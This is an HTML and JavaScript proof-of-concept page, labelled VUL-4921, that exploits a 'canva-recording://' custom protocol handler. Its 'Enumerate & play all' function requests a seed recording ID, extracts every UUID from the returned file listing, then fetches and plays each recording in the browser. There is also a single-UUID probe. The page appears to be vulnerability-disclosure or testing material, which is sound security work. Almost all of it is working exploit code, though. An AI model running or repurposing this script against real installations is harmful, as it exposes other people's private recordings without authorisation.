<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>VUL-4921 PoC — canva-recording://</title>
    <style>
      html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        font-family: -apple-system, system-ui, sans-serif;
        color: #111;
        background: #fafafa;
        box-sizing: border-box;
      }
      *, *::before, *::after { box-sizing: inherit; }
      body {
        display: flex;
        flex-direction: column;
        padding: 12px;
        gap: 10px;
      }

      header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 10px;
        flex-wrap: wrap;
      }
      h1 {
        font-size: 14px;
        margin: 0;
        font-weight: 600;
      }
      h1 code {
        font-size: 12px;
        background: #eee;
        padding: 1px 5px;
        border-radius: 3px;
      }
      .status {
        font-size: 12px;
        color: #555;
        display: flex;
        align-items: center;
        gap: 6px;
      }
      .status .badge {
        padding: 1px 6px;
        border-radius: 4px;
        font-size: 11px;
        font-weight: 600;
      }
      .status .ok  { background: #d9f7d9; color: #036b03; }
      .status .bad { background: #ffd9d9; color: #7a0000; }
      .status .neu { background: #e6e6e6; color: #333; }

      .controls {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
        align-items: center;
      }
      button {
        font: inherit;
        font-size: 13px;
        padding: 6px 12px;
        border: 1px solid #d0d0d0;
        border-radius: 6px;
        background: #fff;
        cursor: pointer;
        transition: background 0.1s;
      }
      button:hover:not(:disabled) { background: #f0f0f0; }
      button:disabled { opacity: 0.5; cursor: default; }
      button.primary {
        background: #b91c1c;
        color: #fff;
        border-color: #991616;
      }
      button.primary:hover:not(:disabled) { background: #991616; }

      details {
        font-size: 12px;
        color: #666;
      }
      details summary { cursor: pointer; user-select: none; padding: 2px 0; }
      details .row {
        display: flex;
        gap: 6px;
        margin-top: 6px;
        align-items: center;
      }
      input[type="text"] {
        font: inherit;
        font-size: 12px;
        padding: 5px 8px;
        flex: 1;
        min-width: 0;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-family: ui-monospace, Menlo, monospace;
      }

      #results {
        flex: 1;
        overflow: auto;
        display: flex;
        flex-direction: column;
        gap: 6px;
        padding: 2px;
      }
      #results:empty::before {
        content: "No recordings — click the attack button to enumerate.";
        color: #999;
        font-size: 12px;
        font-style: italic;
        text-align: center;
        padding: 32px 12px;
      }
      .row-item {
        border: 1px solid #d8d8d8;
        border-left-width: 4px;
        border-radius: 6px;
        background: #fff;
        padding: 8px 10px;
        display: flex;
        flex-direction: column;
        gap: 6px;
        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.03);
      }
      .row-item.hit  { border-left-color: #16a34a; }
      .row-item.miss { border-left-color: #b91c1c; }
      .row-item .top {
        display: flex;
        align-items: center;
        gap: 8px;
        min-width: 0;
      }
      .row-item .uuid {
        font-family: ui-monospace, Menlo, monospace;
        font-size: 12px;
        color: #222;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        flex: 1;
        min-width: 0;
      }
      .row-item .status-badge {
        padding: 1px 6px;
        border-radius: 4px;
        font-size: 11px;
        font-weight: 600;
        white-space: nowrap;
      }
      .row-item.hit  .status-badge { background: #d9f7d9; color: #036b03; }
      .row-item.miss .status-badge { background: #ffd9d9; color: #7a0000; }
      .row-item .size {
        font-family: ui-monospace, Menlo, monospace;
        font-size: 11px;
        color: #7a0000;
        font-weight: 600;
        white-space: nowrap;
      }
      .row-item video {
        width: 100%;
        max-height: 260px;
        background: #000;
        border-radius: 4px;
        display: block;
      }
    </style>
  </head>
  <body>
    <header>
      <h1>VUL-4921 — <code>canva-recording://</code> PoC</h1>
      <div class="status">
        <span id="statusBadge" class="badge neu">idle</span>
        <span id="statusText"></span>
      </div>
    </header>

    <div class="controls">
      <button id="attackBtn" class="primary">Enumerate &amp; play all</button>
      <button id="clearBtn">Clear</button>
    </div>

    <details>
      <summary>Advanced: probe a single UUID</summary>
      <div class="row">
        <input id="uuid" type="text" value="00000000-0000-0000-0000-000000000000" />
        <button id="playBtn">Play</button>
      </div>
    </details>

    <div id="results"></div>

    <script>
      const results = document.getElementById('results');
      const uuidInput = document.getElementById('uuid');
      const attackBtn = document.getElementById('attackBtn');
      const playBtn = document.getElementById('playBtn');
      const clearBtn = document.getElementById('clearBtn');
      const statusBadge = document.getElementById('statusBadge');
      const statusText = document.getElementById('statusText');

      const UUID_ANY_RE = /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/g;

      function setStatus(kind, text) {
        statusBadge.className = 'badge ' + kind;
        statusBadge.textContent = kind === 'neu' ? 'idle' : kind === 'ok' ? 'blocked' : 'exposed';
        statusText.textContent = text || '';
      }

      function setBusy(busy) {
        attackBtn.disabled = busy;
        playBtn.disabled = busy;
        if (busy) {
          statusBadge.className = 'badge neu';
          statusBadge.textContent = 'running…';
        }
      }

      function clearAll() {
        for (const v of results.querySelectorAll('video')) {
          try { URL.revokeObjectURL(v.src); } catch {}
        }
        results.innerHTML = '';
        setStatus('neu', '');
      }

      function addCard({ id, label, blob, error }) {
        const el = document.createElement('div');
        el.className = 'row-item ' + (blob ? 'hit' : 'miss');

        const top = document.createElement('div');
        top.className = 'top';
        const idEl = document.createElement('span');
        idEl.className = 'uuid';
        idEl.title = `${id}${label ? '\n' + label : ''}`;
        idEl.textContent = id;
        const badge = document.createElement('span');
        badge.className = 'status-badge';
        badge.textContent = blob ? '200 OK' : (error || 'not playable');
        top.append(idEl, badge);
        if (blob) {
          const sizeEl = document.createElement('span');
          sizeEl.className = 'size';
          sizeEl.textContent = `${(blob.size / 1024).toFixed(1)} KB`;
          top.append(sizeEl);
        }
        el.append(top);

        if (blob) {
          const v = document.createElement('video');
          v.controls = true;
          v.muted = true;
          v.src = URL.createObjectURL(blob);
          el.append(v);
        }
        results.append(el);
      }

      function extractCandidates(files) {
        const seen = new Set();
        const out = [];
        for (const f of files) {
          const label = f && typeof f === 'object' ? (f.name || f.id || JSON.stringify(f)) : String(f);
          const matches = JSON.stringify(f).match(UUID_ANY_RE) || [];
          for (const m of matches) {
            const key = m.toLowerCase();
            if (!seen.has(key)) {
              seen.add(key);
              out.push({ id: m, label });
            }
          }
        }
        return out;
      }

      async function fetchRecording(id) {
        const res = await fetch(`canva-recording://app/recording/${id}`);
        const ct = res.headers.get('content-type') || '';
        if (res.status === 200 && ct.startsWith('video/')) {
          return { ok: true, blob: await res.blob() };
        }
        return { ok: false, status: `${res.status} ${res.statusText}` };
      }

      async function attack() {
        clearAll();
        setBusy(true);
        try {
          const seed = uuidInput.value.trim() || '00000000-0000-0000-0000-000000000000';
          const res = await fetch(`canva-recording://app/recording/${seed}`);
          const ct = res.headers.get('content-type') || '';

          if (res.status === 403) {
            setStatus('ok', `blocked at probe (${res.status})`);
            return;
          }
          if (!ct.includes('application/json')) {
            setStatus('ok', `no listing (${res.status})`);
            return;
          }
          const body = await res.json();
          if (!Array.isArray(body?.files)) {
            setStatus('ok', 'no files[] in response');
            return;
          }

          const candidates = extractCandidates(body.files);
          if (candidates.length === 0) {
            setStatus('ok', `${body.files.length} entries, no UUIDs`);
            return;
          }

          let hits = 0;
          for (const c of candidates) {
            try {
              const r = await fetchRecording(c.id);
              if (r.ok) {
                hits++;
                addCard({ id: c.id, label: c.label, blob: r.blob });
              } else {
                addCard({ id: c.id, label: c.label, error: r.status });
              }
            } catch {
              addCard({ id: c.id, label: c.label, error: 'threw' });
            }
          }
          setStatus('bad', `${hits}/${candidates.length} playable`);
        } catch (err) {
          setStatus('ok', `fetch threw: ${err?.message || err}`);
        } finally {
          setBusy(false);
        }
      }

      async function playOne() {
        clearAll();
        setBusy(true);
        try {
          const id = uuidInput.value.trim();
          const r = await fetchRecording(id);
          if (r.ok) {
            addCard({ id, blob: r.blob });
            setStatus('bad', '1/1 playable');
          } else {
            addCard({ id, error: r.status });
            setStatus('ok', r.status);
          }
        } catch (err) {
          setStatus('ok', `fetch threw: ${err?.message || err}`);
        } finally {
          setBusy(false);
        }
      }

      attackBtn.addEventListener('click', attack);
      playBtn.addEventListener('click', playOne);
      clearBtn.addEventListener('click', clearAll);
    </script>
  </body>
</html>
